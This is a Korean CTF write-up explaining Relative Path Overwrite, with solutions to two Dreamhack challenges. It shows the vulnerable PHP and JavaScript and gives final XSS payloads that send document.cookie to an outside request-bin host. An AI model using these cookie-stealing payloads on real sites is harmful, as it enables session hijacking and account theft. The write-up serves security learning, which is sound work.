> 💡 상대 경로 기반의 URL을 덮어써서 의도하지 않은 동작을 수행

<br>

### RPO 요구사항

1. <! DOCTYPE> 태그가 없어야 함 ⇒ quirks 모드를 활성화
2. **상대 경로**를 사용하여 가져오는 스타일 시트가 있어야함 

**서버는 하위 요소를 경로가 아닌 파라미터로 인식하고 브라우저는 URL 경로 중 어디부터가 파라미터인지 구분을 못해 전체를 경로로 인식**

<br>

**quirks 모드**

웹 브라우저가 오래된 웹 페이지와의 호환성을 위해 제공하는 렌더링 모드

DOCTYPE이 없거나 잘못 선언된 경우 브라우저는 Quirks  모드로 렌더링 된다

<br>

---

### 응용 - 드림핵 **Relative Path Overwrite**

[bot.py]

```php
<?php
      $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
      if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
          include $page;
?>
```

.. / : 를 필터링하고 있으므로 Path traversal 공격이 불가능하다 

<br>

[vuln.php]

```html
<script src="filter.js"></script> 
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter === 'undefined') {
        param = "nope !!";
    }
    else {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```

- DOCUTYPE가 없다
- <script src="filter.js"></script> : 상대경로로 filter.js를 불러온다

<br>

filter.js의 내용은 아래와 같다.

```
var filter = ["script", "on", "frame", "object"];
```

<br>

필터링에 걸리지 않으면 `param_elem.innerHTML = param` 을 수행한다.

<br>

RPO를 통해 상대경로인 filter.js 자체를 불러오지 못하도록 할 수 있다. 

<img src="https://github.com/user-attachments/assets/8fae6dad-2121-475c-a275-913aebb04dc9" width=600>

<br>

기존대로 하면 filter.js가 불러와진다.

<br>

그러나 경로를 index.php 로 변경하면 경로를 index.php/filter.js로 인식하여 index.php를 불러오게 된다.

<img src="https://github.com/user-attachments/assets/227541f2-58b2-439a-afab-5064d0275c30" width=600>

<br>

아래 명령을 report 페이지에 보내면 request bin 에 플래그가 도착한다. +는 공백처리되기 때문에 %2B로 적어주어야 한다.

<br>

```jsx
/index.php/?page=vuln&param=<img src=x onerror="location.href='https://sfbwozt.request.dreamhack.games?'%2bdocument.cookie">
```

<br>

---

### 응용2 - 드림핵 **Relative Path Overwrite Advanced**

filter.js 위치가 deploy\src 에서 `deploy\src\static`으로 바뀌었다. 

<br>

vuln.php와 동일한 경로에 filter.js가 없기 때문에 <script src="filter.js"></script>는 실패하고 아래 조건문에서 nope가 뜨게된다. 

```php
if (typeof filter === 'undefined') {
    param = "nope !!";
}
```

<br>

/static/script.js로 로드되어야 할 파일을 /`[USER_INPUT]`/**static**/script.js의 형태로 로드할 수 있을 때, USER_INPUT에 XSS를 넣으면 응답에서 XSS가 실행 된다

```
/index.php/**;alert(1);/**/?page=vuln&param=dreamhack
```

위와 같은 형태로 경로를 구성한다면 해당 내용이 **`script 태그의 src로 들어가`** alert(1);를 실행한다

<img src="https://github.com/user-attachments/assets/8f17498a-a7c3-46b4-bf71-59a13917e480" width=600>

<br>

최종 페이로드 

`index.php/;location.href='https://rsdyjtn.request.dreamhack.games/?%27+document.cookie;//?page=vuln&param=dreamhack`
